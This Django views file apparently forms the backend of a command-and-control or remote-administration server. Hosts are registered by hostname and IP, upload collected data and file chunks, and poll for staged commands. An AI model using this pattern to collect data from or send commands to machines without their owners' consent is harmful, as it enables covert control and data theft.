from django.shortcuts import render
from django.shortcuts import get_object_or_404, render
from .models import Computer,Data,Action
from django.http import JsonResponse
import hashlib

# Create your views here.
def index(request):
    return render(request, 'index.html')

def data_collection(request, hostname, ip,data_type,data_content,data_hash=None):
    host=Computer.objects.filter(hostname=hostname,ip_address=ip)
    if host.exists():
        host=host[0]
    else:
        host=Computer.objects.create(hostname=hostname,ip_address=ip)
        host.save()
    if data_hash:
        data=Data.objects.filter(data_hash=data_hash,computer=host)
        if data.exists():
            data=data[0]
            data.data_content=data.data_content+data_content
        else:
            data=Data.objects.create(computer=host,data_type=data_type,data_content=data_content,is_file=True,data_hash=data_hash)
    else:
        data=Data.objects.create(computer=host,data_type=data_type,data_content=data_content,data_hash=hashlib.md5(str(data_content).encode('utf-8')).hexdigest())
    data.save()
    return render(request, 'index.html')

def get_command(request,hostname,ip,random):
    host=Computer.objects.filter(hostname=hostname,ip_address=ip)
    if host.exists():
        host=host[0]
        command=Action.objects.filter(computer=host,performed=False,staged=True).order_by('pub_date')
        if command.exists():
            command=command[0]
            command.performed=True
            command.save()
            return JsonResponse({'actions':command.command})
    return JsonResponse({'actions':''})